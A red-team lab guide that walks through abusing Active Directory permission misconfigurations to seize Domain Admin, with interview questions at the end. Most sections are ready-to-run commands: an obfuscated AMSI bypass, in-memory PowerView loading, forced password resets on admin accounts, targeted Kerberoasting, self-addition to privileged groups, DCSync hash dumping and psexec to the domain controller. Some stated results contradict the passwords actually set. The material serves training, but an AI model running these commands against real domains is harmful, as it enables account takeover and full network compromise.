# ACL ABUSE: THE COMPLETE GUIDE
## Stealing Domain Admin Through Permission Misconfigurations

> **ACL Abuse is often the FASTEST path to Domain Admin in real environments.**
>
> Instead of cracking passwords or exploiting vulnerabilities, you:
> - Find users with excessive permissions on other users/groups
> - Use those permissions to reset passwords or modify groups
> - Escalate to Domain Admin in minutes!
>
> This guide explains EVERYTHING from the ground up.

---

# TABLE OF CONTENTS

**PART 1: Understanding ACLs (From Zero)**
- What are ACLs?
- ACLs vs ACEs vs DACLs
- Real-world analogies
- Why this matters for hacking

**PART 2: Dangerous Permissions**
- GenericAll (Full Control)
- WriteDACL (Modify Permissions)
- WriteOwner (Take Ownership)
- ForceChangePassword
- AddMember
- WriteProperty

**PART 3: Lab Setup**
- Running Enable-ExcessivePrivileges.ps1
- What permissions are created

**PART 4: Finding ACL Abuse Paths**
- Using BloodHound to find paths
- Understanding the graph
- Marking owned principals

**PART 5: Exploiting GenericAll**
- Method 1: Reset password
- Method 2: Targeted Kerberoasting (adding SPN)
- Using PowerView via Sliver

**PART 6: Exploiting WriteDACL**
- Grant yourself GenericAll
- DCSync rights abuse

**PART 7: Exploiting ForceChangePassword**
- Direct password change
- No need to know current password

**PART 8: Interview Questions**

---

# 📖 PART 1: Understanding ACLs (From Zero)

## 1.1: What is an ACL?

**ACL = Access Control List = A list of who can do what to an object**

### Real-World Analogy: Office Building

```
OFFICE BUILDING PERMISSIONS:
────────────────────────────

Object: CEO's Office (the door)

ACL (Access Control List):
┌────────────────────────────────────────────────────────┐
│ WHO                 │ WHAT THEY CAN DO                  │
├────────────────────────────────────────────────────────┤
│ CEO                 │ Full Control (unlock, modify)     │ ← ACE 1
│ Assistant           │ Read (can knock, see inside)      │ ← ACE 2
│ IT Admin            │ Modify Lock (change permissions)  │ ← ACE 3
│ Janitor             │ Write Inside (clean, but no lock) │ ← ACE 4
└────────────────────────────────────────────────────────┘

Each row = One ACE (Access Control Entry)
The whole table = The ACL (Access Control List)
```

### In Active Directory

Every object (user, group, computer, OU) has an ACL.

**Example: User "lakshmi.devi"**
```
Object: lakshmi.devi@orsubank.local

ACL:
┌────────────────────────────────────────────────────────┐
│ WHO                 │ WHAT THEY CAN DO                  │
├────────────────────────────────────────────────────────┤
│ lakshmi.devi        │ Full Control (herself)            │
│ Domain Admins       │ Full Control                      │
│ vamsi.krishna       │ GenericAll (FULL CONTROL!)        │ ← VULNERABLE!
└────────────────────────────────────────────────────────┘
```

**If you compromise `vamsi.krishna`, you can do ANYTHING to `lakshmi.devi`!**

---

## 1.2: ACL vs ACE vs DACL - The Confusing Terms

| Term | Meaning | Analogy |
|------|---------|---------|
| **ACL** | Access Control List | The entire permission table |
| **ACE** | Access Control Entry | One row in the table |
| **DACL** | Discretionary ACL | The "who can access this" list (most common) |
| **SACL** | System ACL | The "who to audit" list (for logging) |

**For hacking, we care about DACL.**

---

## 1.3: Why This Matters for Red Teaming

**Insight:** Active Directory permissions are COMPLEX and often MISCONFIGURED.

```
COMMON MISCONFIGURATIONS:
─────────────────────────

❌ Help Desk has GenericAll on ALL users (to reset passwords)
   → You compromise Help Desk = You own ALL users!

❌ Service account has WriteDACL on Domain object
   → You crack service account = You grant yourself DCSync!

❌ User has AddMember on Domain Admins
   → You compromise that user = Add yourself to DA!

❌ Nested group permissions
   → IT_Support → Server_Admins → Domain Admins
   → Compromise IT_Support = Eventually DA!
```

**BloodHound finds these automatically!**

---

# 📖 PART 2: Dangerous Permissions

## 2.1: GenericAll (Full Control)

**GenericAll = You can do ANYTHING to this object**

### What you can do:
- Reset the password (without knowing current password!)
- Modify attributes (email, description, SPN)
- Add the object to groups
- Change permissions on the object

### Attack Scenarios:
```
You: vamsi.krishna
Target: lakshmi.devi (has GenericAll)
lakshmi.devi is in: Domain Admins

Attack:
1. Reset lakshmi.devi's password
2. Login as lakshmi.devi
3. You are now Domain Admin!
```

---

## 2.2: WriteDACL (Modify Permissions)

**WriteDACL = You can modify the ACL (permissions) of an object**

### What you can do:
- Grant yourself GenericAll
- Grant yourself any other permission

### Attack Scenario:
```
You: vamsi.krishna (has WriteDACL on lakshmi.devi)

Attack:
1. Grant yourself GenericAll on lakshmi.devi
2. Now you have GenericAll (see above)
3. Reset lakshmi.devi's password
4. Domain Admin!
```

---

## 2.3: ForceChangePassword

**ForceChangePassword = You can change someone's password without knowing the current one**

### Attack Scenario:
```
You: vamsi.krishna (has ForceChangePassword on pranavi)
pranavi is in: IT_Support → Domain Admins

Attack:
1. Change pranavi's password to "NewPassword123!"
2. Login as pranavi
3. Escalate via group membership
```

---

## 2.4: AddMember (Add to Group)

**AddMember = You can add anyone to a group**

### Attack Scenario:
```
You: vamsi.krishna (has AddMember on "Domain Admins" group)

Attack:
1. Add-ADGroupMember -Identity "Domain Admins" -Members "vamsi.krishna"
2. You are now Domain Admin!
```

---

## 2.5: WriteOwner (Take Ownership)

**WriteOwner = You can make yourself the owner of an object**

Owners have implicit GenericAll.

### Attack Scenario:
```
You: vamsi.krishna (has WriteOwner on lakshmi.devi)

Attack:
1. Make yourself the owner of lakshmi.devi
2. As owner, grant yourself GenericAll
3. Reset password
4. Login as lakshmi.devi
```

---

# 📖 PART 3: Lab Setup

## 3.1: Running the Setup Script

**On DC01, run:**
```powershell
cd C:\AD-RTO\lab-config\server
.\Enable-ExcessivePrivileges.ps1
```

### What This Creates:

| Who | Permission | On Whom | Attack Path |
|-----|-----------|----------|-------------|
| vamsi.krishna | GenericAll | lakshmi.devi | Reset password, impersonate admin |
| vamsi.krishna | WriteDACL | IT_Admins group | Add self to IT_Admins → Domain Admin |
| divya | ForceChangePassword | ammulu.orsu (DA) | Force reset DA password → Login as DA |

---

# 📖 PART 4: Finding ACL Abuse Paths with BloodHound

## 4.1: Import BloodHound Data

If you haven't already, run SharpHound (see Walkthrough 01):
```bash
[server] sliver (ORSUBANK_WS01) > execute-assembly /opt/tools/SharpHound.exe -c All
```

Import into BloodHound.

---

## 4.2: Mark Your Owned User

**In BloodHound:**
1. Search for: `vamsi.krishna@orsubank.local`
2. Right-click the node → **Mark User as Owned**

---

## 4.3: Find Shortest Paths from Owned Principals

**Pre-Built Query:**
```
☰ → Shortest Paths from Owned Principals
```

**You'll see graphs like:**
```
[vamsi.krishna] ──[GenericAll]──> [lakshmi.devi] ──[MemberOf]──> [Domain Admins]
```

**This is your attack path!**

---

## 4.4: Understanding the Edge

Click on the edge (arrow) labeled **GenericAll**.

**BloodHound shows:**
- **Abuse Info:** How to exploit this
- **Opsec Considerations:** How noisy this is
- **References:** External links for more info

---

# 📖 PART 5: Exploiting GenericAll

**Scenario:** You have GenericAll on `lakshmi.devi`

## 5.1: Get PowerView

Download PowerView:
```bash
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 -O /opt/tools/PowerView.ps1
```

---

## 5.2: AMSI Bypass (Critical!)

**In Sliver session:**
```bash
[server] sliver (ORSUBANK_WS01) > execute -o powershell.exe -Command "$x=[Ref].Assembly.GetTypes();ForEach($t in $x){if($t.Name -clike '*si*tils'){$t.GetFields('NonPublic,Static')|%{if($_.Name -clike '*ailed'){$_.SetValue($null,$true)}}}}"
```

---

## 5.3: Load PowerView in Memory

**Upload PowerView:**
```bash
[server] sliver (ORSUBANK_WS01) > upload /opt/tools/PowerView.ps1 C:\Windows\Temp\PowerView.ps1
```

**Load it:**
```bash
[server] sliver (ORSUBANK_WS01) > execute -o powershell.exe -Command "IEX(Get-Content C:\Windows\Temp\PowerView.ps1 -Raw)"
```

---

## 5.4: Method 1 - Reset Password

**Using PowerView:**
```bash
[server] sliver (ORSUBANK_WS01) > execute -o powershell.exe -Command "IEX(Get-Content C:\Windows\Temp\PowerView.ps1 -Raw); $pass = ConvertTo-SecureString 'HackedPassword1!' -AsPlainText -Force; Set-DomainUserPassword -Identity lakshmi.devi -AccountPassword $pass"
```

**What this does:**
- `ConvertTo-SecureString` = Converts plain password to secure format
- `Set-DomainUserPassword` = PowerView function to reset password
- `-Identity lakshmi.devi` = Target user
- `-AccountPassword $pass` = New password

**Result:** lakshmi.devi's password is now `NewPassword123!`

---

## 5.5: Verify the Password Works

**From Kali:**
```bash
crackmapexec smb DC01.orsubank.local -u lakshmi.devi -p 'HackedPassword1!' -d orsubank.local
```

**Expected:**
```
SMB   192.168.100.10   445   DC01   [+] orsubank.local\lakshmi.devi:NewPassword123! (Pwn3d!)
```

---

## 5.6: Check lakshmi.devi's Groups

```bash
net rpc group members "Domain Admins" -U "orsubank.local/lakshmi.devi%NewPassword123!" -S DC01.orsubank.local
```

**If lakshmi.devi is in Domain Admins, you are now DA!**

---

## 5.7: Method 2 - Targeted Kerberoasting

**Instead of resetting password, add an SPN to make the account Kerberoastable:**

```bash
[server] sliver (ORSUBANK_WS01) > execute -o powershell.exe -Command "IEX(Get-Content C:\Windows\Temp\PowerView.ps1 -Raw); Set-DomainObject -Identity lakshmi.devi -Set @{serviceprincipalname='fake/service'}"
```

**Then Kerberoast it:**
```bash
[server] sliver (ORSUBANK_WS01) > execute-assembly /opt/tools/Rubeus.exe kerberoast /user:lakshmi.devi /nowrap
```

**Crack the hash offline (less noisy than password reset!)**

---

# 📖 PART 6: Exploiting WriteDACL

**Scenario:** You have WriteDACL on the IT_Admins group

## 6.1: Understand the Goal

WriteDACL lets you modify permissions on an object.

**Lab Setup:**
- You (vamsi.krishna) have WriteDACL on **IT_Admins** group
- IT_Admins is a member of **Domain Admins**

**Attack Path:**
1. Grant yourself **GenericWrite** on IT_Admins (using WriteDACL)
2. Add yourself to IT_Admins group
3. IT_Admins → Domain Admins = You are now DA!

---

## 6.2: Grant Yourself GenericWrite on IT_Admins

**Using PowerView:**
```bash
[server] sliver (ORSUBANK_WS01) > execute -o powershell.exe -Command "IEX(Get-Content C:\Windows\Temp\PowerView.ps1 -Raw); Add-DomainObjectAcl -TargetIdentity 'IT_Admins' -PrincipalIdentity vamsi.krishna -Rights GenericWrite"
```

**What this does:**
- `Add-DomainObjectAcl` = Add an ACE to an object's ACL
- `-TargetIdentity 'IT_Admins'` = The IT_Admins group
- `-PrincipalIdentity vamsi.krishna` = Who to grant rights to (yourself!)
- `-Rights GenericWrite` = Ability to write properties including group membership

---

## 6.3: Add Yourself to IT_Admins Group

**Now add yourself to the group:**
```bash
[server] sliver (ORSUBANK_WS01) > execute -o powershell.exe -Command "Add-ADGroupMember -Identity 'IT_Admins' -Members 'vamsi.krishna'"
```

**Or using net command:**
```bash
[server] sliver (ORSUBANK_WS01) > execute -o cmd.exe /c "net group IT_Admins vamsi.krishna /add /domain"
```

---

## 6.4: Verify Domain Admin Access

**Check your groups:**
```bash
[server] sliver (ORSUBANK_WS01) > execute -o cmd.exe /c "whoami /groups"
```

**You should see:**
```
ORSUBANK\IT_Admins
ORSUBANK\Domain Admins  ? Through IT_Admins membership!
```

**Test DA access:**
```bash
crackmapexec smb DC01.orsubank.local -u vamsi.krishna -p 'Password123!' -d orsubank.local
```

**Expected:**
```
SMB   DC01.orsubank.local   445   DC01   [+] orsubank.local\vamsi.krishna:Password123! (Pwn3d!)
```

**You are now Domain Admin!**

---

### 6.5: Alternative - DCSync Rights (Advanced)

**Note:** The lab creates WriteDACL on IT_Admins group. However, WriteDACL can also be exploited on the **Domain object** itself to grant DCSync rights.

**If you had WriteDACL on the Domain:**
```bash
Add-DomainObjectAcl -TargetIdentity 'DC=orsubank,DC=local' -PrincipalIdentity vamsi.krishna -Rights DCSync
secretsdump.py orsubank.local/vamsi.krishna:'Password123!'@DC01.orsubank.local
```

This is covered in **[Walkthrough 04b: DCSync Attack](./04b_dcsync_attack.md)**.

---

# 📖 PART 7: Exploiting ForceChangePassword

**Scenario:** You have compromised divya who has ForceChangePassword on ammulu.orsu (Domain Admin)

## 7.1: Understanding the Setup

**Lab Configuration:**
- **divya** has ForceChangePassword extended right on **ammulu.orsu**
- **ammulu.orsu** is a member of **Domain Admins**
- ForceChangePassword allows resetting password WITHOUT knowing the current one

**Attack Path:**
1. Compromise or login as divya
2. Force reset ammulu.orsu's password
3. Login as ammulu.orsu
4. You are now Domain Admin!

---

## 7.2: Change ammulu.orsu's Password

**Using PowerView:**
```bash
[server] sliver (ORSUBANK_WS01) > execute -o powershell.exe -Command "IEX(Get-Content C:\Windows\Temp\PowerView.ps1 -Raw); $pass = ConvertTo-SecureString 'HackedPassword1!' -AsPlainText -Force; Set-DomainUserPassword -Identity ammulu.orsu -AccountPassword $pass"
```

**What this does:**
- `ConvertTo-SecureString` = Convert plain password to secure format
- `Set-DomainUserPassword` = PowerView function to reset password
- `-Identity ammulu.orsu` = Target Domain Admin user
- `-AccountPassword $pass` = New password (HackedPassword1!)

**Result:** ammulu.orsu's password is now `HackedPassword1!`

---

## 7.3: Login as ammulu.orsu (Domain Admin)

**From Kali:**
```bash
crackmapexec smb DC01.orsubank.local -u ammulu.orsu -p 'HackedPassword1!' -d orsubank.local
```

**Expected:**
```
SMB   DC01.orsubank.local   445   DC01   [+] orsubank.local\ammulu.orsu:HackedPassword1! (Pwn3d!)
```

---

## 7.4: Verify Domain Admin Rights

**Check ammulu.orsu's groups:**
```bash
net rpc group members "Domain Admins" -U "orsubank.local/ammulu.orsu%HackedPassword1!" -S DC01.orsubank.local
```

**You'll see ammulu.orsu is a member!**

**Get a shell on DC:**
```bash
psexec.py orsubank.local/ammulu.orsu:'HackedPassword1!'@DC01.orsubank.local
```

**You are now SYSTEM on the Domain Controller!**

---

# 📖 PART 8: Interview Questions

## Q1: "What is an ACL in Active Directory?"

**YOUR ANSWER:**
"An ACL (Access Control List) is a list of permissions on an Active Directory object that defines who can perform what actions on that object. Each ACL contains ACEs (Access Control Entries), where each ACE specifies a security principal (user/group) and the rights they have.

There are two types:
- **DACL (Discretionary ACL):** Who can access the object and what they can do
- **SACL (System ACL):** What actions should be audited

For example, a user object might have an ACE granting 'Domain Admins' GenericAll, and another ACE granting 'Help Desk' the ability to reset passwords."

---

## Q2: "What is GenericAll and why is it dangerous?"

**YOUR ANSWER:**
"GenericAll is an Active Directory permission that grants full control over an object. When you have GenericAll on a user account, you can:
- Reset their password without knowing the current password
- Modify any attribute (add SPNs for Kerberoasting)
- Add them to groups
- Change their permissions

From a red team perspective, it's dangerous because:
1. It's often granted too broadly (Help Desk on all users)
2. It provides a direct escalation path
3. BloodHound easily identifies these paths
4. Exploitation is simple with tools like PowerView

In engagements, I've found GenericAll on high-privilege accounts as the fastest path to Domain Admin."

---

## Q3: "How would you abuse WriteDACL on the domain object?"

**YOUR ANSWER:**
"WriteDACL on the domain object allows you to modify the domain's DACL. The most powerful abuse is granting yourself DCSync rights by adding two specific ACEs:
1. DS-Replication-Get-Changes
2. DS-Replication-Get-Changes-All

Using PowerView:
```
Add-DomainObjectAcl -TargetIdentity 'DC=domain,DC=com' -PrincipalIdentity compromised_user -Rights DCSync
```

Then I can use secretsdump.py or Mimikatz's lsadump::dcsync to replicate the entire domain database, extracting all password hashes including krbtgt for a Golden Ticket.

This is particularly powerful because it's achieved without touching the DC directly - all requests look like legitimate replication traffic."

---

## Q4: "What's the difference between ForceChangePassword and GenericAll?"

**YOUR ANSWER:**
"Both allow resetting passwords, but the scope differs:

**ForceChangePassword:**
- Specific permission to change password only
- Cannot modify other attributes
- Cannot change permissions
- More commonly granted (less suspicious)

**GenericAll:**
- Full control over the object
- Can reset password AND modify any attribute
- Can change permissions on the object
- Can add to groups
- Much broader permission

From an opsec perspective, if I have the choice, I prefer ForceChangePassword because it's a more 'normal' permission for Help Desk staff, so it's less likely to be monitored. GenericAll might indicate a misconfiguration that could be flagged."

---

## Q5: "How do you detect ACL abuse?"

**YOUR ANSWER:**
"Detection involves multiple layers:

1. **Event Logging:**
   - Event ID 4738: User account changed (password resets)
   - Event ID 5136: Directory object modified (ACL changes)
   - Event ID 4662: Operation performed on object (DCSync)

2. **Behavioral Analytics:**
   - Unusual permission grants (WriteDACL usage)
   - Password resets from non-service desk accounts
   - DCSync from non-DC computers

3. **Regular Audits:**
   - Review ACLs on critical objects (Domain, Domain Admins, Enterprise Admins)
   - Use tools like PingCastle or BloodHound (purple team mode)
   - Check for users with excessive permissions

4. **Honey Objects:**
   - Create high-privilege users with interesting names
   - Monitor for any modifications to them

The challenge is the high volume of legitimate ACL operations, requiring baseline behavior analysis."

---

# ✅ CHECKLIST

- [ ] Ran Enable-ExcessivePrivileges.ps1 on DC01
- [ ] Found ACL abuse paths in BloodHound
- [ ] Marked vamsi.krishna as owned
- [ ] Ran "Shortest Paths from Owned Principals"
- [ ] Downloaded and loaded PowerView
- [ ] Bypassed AMSI
- [ ] Exploited GenericAll (reset password)
- [ ] Verified credentials work
- [ ] Confirmed Domain Admin access

---

# 🔗 What's Next?

**If you're now Domain Admin:**
→ **[07. Golden Ticket](./07_golden_ticket.md)** (Create persistent access)
→ **[04b. DCSync](./04b_dcsync_attack.md)** (Dump all domain hashes)

**If you want to move laterally:**
→ **[06. Pass-the-Hash](./06_pass_the_hash.md)** (Use hashes to access other machines)

**If you want to learn more Kerberos attacks:**
→ **[06b. Pass-the-Ticket](./06b_pass_the_ticket.md)** (Steal and reuse Kerberos tickets)

---

**MITRE ATT&CK Mapping:**
| Technique | ID | Description |
|-----------|-----|-------------|
| Valid Accounts: Domain Accounts | T1078.002 | Using compromised credentials |
| Account Manipulation | T1098 | Modifying account permissions |
| Steal or Forge Kerberos Tickets: Kerberoasting | T1558.003 | Adding SPN for roasting |

**Difficulty:** ⭐⭐⭐ (Intermediate)
**Interview Importance:** ⭐⭐⭐⭐⭐ (ACL abuse is critical for advanced AD interviews)

---



